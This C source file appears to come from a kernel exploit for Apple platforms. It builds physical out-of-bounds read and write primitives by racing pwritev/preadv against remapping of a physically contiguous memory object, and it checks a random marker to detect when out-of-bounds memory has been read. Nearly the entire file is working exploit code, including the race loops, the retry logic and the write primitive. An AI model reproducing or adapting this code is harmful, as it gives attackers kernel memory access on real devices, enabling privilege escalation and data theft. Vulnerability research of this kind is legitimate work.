#include "phys_oob.h"

#include <string.h>
#include <sys/uio.h>
#include <unistd.h>

#include "surface.h"

// creates physically contiguous mapping in Purplegfxmem and sets marker to it
void initialize_physical_read_write(mach_vm_size_t contiguous_mapping_size) {
    g_ctx.pc_size = contiguous_mapping_size;
    kern_return_t kr = create_physically_contiguous_mapping(&g_ctx.pc_object, &g_ctx.pc_address, g_ctx.pc_size);
    if (kr != KERN_SUCCESS) {
        LOG_ERR("create_physically_contiguous_mapping: %s (%d)", mach_error_string(kr), kr);
        return;
    }

    // pc -> physically contiguous
    LOG("pc_object: %#x", g_ctx.pc_object);
    LOG("pc_address: %#llx", g_ctx.pc_address);

    // set random marker
    memset_pattern8((void*)g_ctx.pc_address, &g_ctx.random_marker, g_ctx.pc_size);

    // "free target" will be the addr of the pc mapping
    g_ctx.free_target = g_ctx.pc_address;
    g_ctx.free_target_size = g_ctx.pc_size;

    atomic_store_explicit(&g_ctx.shared->free_target_sync, g_ctx.free_target, memory_order_seq_cst);
    atomic_store_explicit(&g_ctx.shared->free_target_size_sync, g_ctx.free_target_size, memory_order_seq_cst);
    atomic_store_explicit(&g_ctx.shared->free_thread_start, 1, memory_order_seq_cst);
    atomic_store_explicit(&g_ctx.shared->go_sync, 1, memory_order_seq_cst);
}

kern_return_t physical_oob_read_mo(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, uint64_t offset, uint8_t* buffer) {
    // target_object_sync here on first pass is set to memory_object from mem entry
    atomic_store_explicit(&g_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
    // offset we're at in the search mapping
    atomic_store_explicit(&g_ctx.shared->target_object_offset_sync, mo_offset, memory_order_seq_cst);

    // set iov base to physically contiguous addr + 0x3f00
    g_ctx.iov.iov_base = (void*)(g_ctx.pc_address + 0x3f00);
    //    LOG_DEBUG("iov_base %#llx", (g_ctx.pc_address + 0x3f00));
    // offset is oob_offset, size is oob_size, so 0x100 + 0xf00 = 0x1000?
    g_ctx.iov.iov_len = offset + size;
    //    LOG_DEBUG("iov_len %#lx", g_ctx.iov.iov_len);

    memcpy(buffer, &g_ctx.random_marker, sizeof(uint64_t));
    memcpy((void*)(g_ctx.pc_address + 0x3f00 + offset), &g_ctx.random_marker, sizeof(uint64_t));

    bool read_race_succeeded = false;
    ssize_t w = 0;

    for (uint64_t try_idx = 0; try_idx < (g_ctx.highiest_success_idx + 100); try_idx++) {
        atomic_store_explicit(&g_ctx.shared->race_sync, 1, memory_order_seq_cst);
        // trigger bug to read oob_offset oob
        w = pwritev(g_ctx.read_fd, &g_ctx.iov, 1, 0x3f00);
        while (atomic_load_explicit(&g_ctx.shared->race_sync, memory_order_seq_cst) == 1);
        mach_vm_address_t map_addr = g_ctx.pc_address;
        // put physicallly contiguous mapping back
        kern_return_t kr =
            mach_vm_map(mach_task_self(), &map_addr, g_ctx.pc_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, g_ctx.pc_object, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            LOG_ERR("physical_oob_read_mo: mach_vm_map: %s (%d)", mach_error_string(kr), kr);
            return KERN_FAILURE;
        }

        if (w == -1) {
            // LOG_ERR("pwritev failed: %s (errno=%d)\n", strerror(errno), errno);
            // read size bytes into buffer from read_fd at 0x3f00 + offset
            // write from file at offset to buffer which will read only oob mem
            pread(g_ctx.read_fd, buffer, size, 0x3f00 + offset);
            uint64_t marker = 0;
            memcpy(&marker, buffer, sizeof(marker));
            // if marker is not random_marker, we read oob successfully
            if (marker != g_ctx.random_marker) {
                read_race_succeeded = true;
                g_ctx.success_read_count += 1;
                if (try_idx > g_ctx.highiest_success_idx) {
                    g_ctx.highiest_success_idx = try_idx;
                }
                break;
            }
            usleep(1);
        }

        if (try_idx == 500) {
            // LOG_DEBUG("we failed");
            break;
        }
    }
    // LOG_DEBUG("read race result success is: %s", read_race_succeeded ? "true" : "false");
    atomic_store_explicit(&g_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
    return read_race_succeeded ? KERN_SUCCESS : KERN_FAILURE;
}

// retry until success
void physical_oob_read_mo_with_retry(mach_port_t memory_object, mach_vm_offset_t seeking_offset, uint64_t oob_size, uint64_t oob_offset, uint8_t* read_buffer) {
    while (true) {
        kern_return_t kr = physical_oob_read_mo(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
        if (kr == KERN_SUCCESS) {
            break;
        }
    }
}

void physical_oob_write_mo(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, uint64_t offset, uint8_t* buffer) {
    atomic_store_explicit(&g_ctx.shared->target_object_sync, mo, memory_order_seq_cst);
    atomic_store_explicit(&g_ctx.shared->target_object_offset_sync, mo_offset, memory_order_seq_cst);

    g_ctx.iov.iov_base = (void*)(g_ctx.pc_address + 0x3f00);
    g_ctx.iov.iov_len = offset + size;
    // read from buffer into fd
    pwrite(g_ctx.write_fd, buffer, size, 0x3f00 + offset);

    for (uint64_t try_idx = 0; try_idx < 20; try_idx++) {
        atomic_store_explicit(&g_ctx.shared->race_sync, 1, memory_order_seq_cst);
        // write from the fd into (oob) memory
        preadv(g_ctx.write_fd, &g_ctx.iov, 1, 0x3f00);
        while (atomic_load_explicit(&g_ctx.shared->race_sync, memory_order_seq_cst) == 1);

        mach_vm_address_t map_addr = g_ctx.pc_address;
        kern_return_t kr =
            mach_vm_map(mach_task_self(), &map_addr, g_ctx.pc_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, g_ctx.pc_object, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            LOG_ERR("physical_oob_write_mo: mach_vm_map: %s (%d)", mach_error_string(kr), kr);
            return;
        }
    }

    atomic_store_explicit(&g_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
}
